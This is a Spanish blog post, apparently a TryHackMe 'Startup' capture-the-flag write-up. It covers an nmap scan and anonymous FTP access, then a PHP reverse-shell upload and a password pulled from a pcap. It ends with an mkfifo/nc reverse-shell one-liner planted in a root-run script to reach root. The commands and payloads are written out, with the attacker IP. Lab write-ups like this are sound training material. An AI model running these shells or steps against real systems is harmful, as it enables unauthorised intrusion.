---
layout: post
title:  "Startup TryHackMe"
date:   2021-05-14 7:21:00 +0200 # Cambiar esto
last_modified_at: 2021-05-14 07:21:29 +0200 # Cambiar esto
toc:  true
tags: [ctf, linux, Tryhackme, Writeup]
categories: Tryhackme
---

{: .message }
## Introducción

Es una maquina linux que nos permite repasar algunos conceptos basicos.

## Enumeración
### Nmap
*Puertos:*

* 21/tcp -->  vsftpd 3.0.3
* 22/tcp --> OpenSSH 7.2p2
* 80/tcp --> Apache httpd 2.4.18

```bash
nmap -p- -T5 -v --open 10.10.120.176 -oG Scanport1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 17:28 EDT
Initiating Ping Scan at 17:28
Scanning 10.10.120.176 [2 ports]
Completed Ping Scan at 17:28, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:28
Completed Parallel DNS resolution of 1 host. at 17:28, 0.01s elapsed
Initiating Connect Scan at 17:28
Scanning 10.10.120.176 [65535 ports]
Discovered open port 21/tcp on 10.10.120.176
Discovered open port 80/tcp on 10.10.120.176
Discovered open port 22/tcp on 10.10.120.176
Connect Scan Timing: About 23.66% done; ETC: 17:30 (0:01:40 remaining)
Connect Scan Timing: About 52.08% done; ETC: 17:30 (0:00:56 remaining)
Completed Connect Scan at 17:30, 120.10s elapsed (65535 total ports)
Nmap scan report for 10.10.120.176
Host is up (0.22s latency).
Not shown: 47310 filtered ports, 18222 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 120.35 seconds
```

*Escaneo mas exhaustivo:*
```bash
# Nmap 7.91 scan initiated Mon May 17 17:39:07 2021 as: nmap -sC -sV -p21,22,80 -oN Scanport2 10.10.120.176
Nmap scan report for 10.10.120.176
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.206.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 17 17:39:26 2021 -- 1 IP address (1 host up) scanned in 19.00 seconds
```

### FTP Enumeracion

Algo a destacar es los permisos que tenemos en el directorio ftp

```bash
ftp 10.10.120.176
Connected to 10.10.120.176.
220 (vsFTPd 3.0.3)
Name (10.10.120.176:benji): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
```


### Fuzz

Utilice dirsearch y pude encontrar un directorio que esta todo lo que se encuentra en el ftp:
* /files

## Shell Inicial (PHP reverse)

La idea es que como ponemos subir archivo y ejecutarlo, subo una reverse de php al ftp para luego visualizarla desde la pagina:

```bash
ftp> put reverse.php
local: reverse.php remote: reverse.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (21.5617 MB/s) 
```

Cambiamos estos parametros:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.206.201';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

![](/images_blog/img_startup/Pastedimage20210517170517.png)

Solo nos podemos al escucha:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.206.201] from (UNKNOWN) [10.10.120.176] 53102
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:52:06 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@startup:/$ 
```

*La primera pregunta se encuentra en la raiz como recipe.txt*

## Shell como Lennie
Enumeramos un poco el sistema y encontramos un archivo que se llama *suspicious.pcapng* nos transferimos dicho archivo:

```bash
www-data@startup:/$ ls
ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
```


```bash
www-data@startup:/$ cd incidents
cd incidents
www-data@startup:/incidents$ ls
ls
suspicious.pcapng
www-data@startup:/incidents$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

## Analisis del suspicious.pcapng

Con el comando strings analizamos el archivo:

Encontramos una password y pruebo a ver si es la del usuario lennie:
*c4ntg3t3n0ughsp1c3*

```bash
strings suspicious.pcapng
...
sudo -l
[sudo] password for www-data: 
@       c4ntg3t3n0ughsp1c3
6%      @
Sorry, try again.
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3
sudo: 3 incorrect password attempts
www-data@startup:/home$ |
cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
...
www-data@startup:/$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/$ 

```


## Extra: Linpeas

```bash         
/vagrant                           
/recipe.txt                       
/vmlinuz.old                       
/vmlinuz                            
/incidents                         
/initrd.img                       
/lost+found                       
/initrd.img.old            
```

## Shell como root

Existe un script que es ejecutado por root, entonces sabiendo esto solo tenemos que ir:

```bash
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Modificamos el archivo */etc/print.sh* y ponemos nuestra reverse:

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.206.201 9999 >/tmp/f
echo "Done!"
```

Nos ponemos a la escucha:

```bash
nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.9.206.201] from (UNKNOWN) [10.10.120.176] 56724
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt
THM{f963aaa6a430********}

```

MACHINE PWNED!!!!!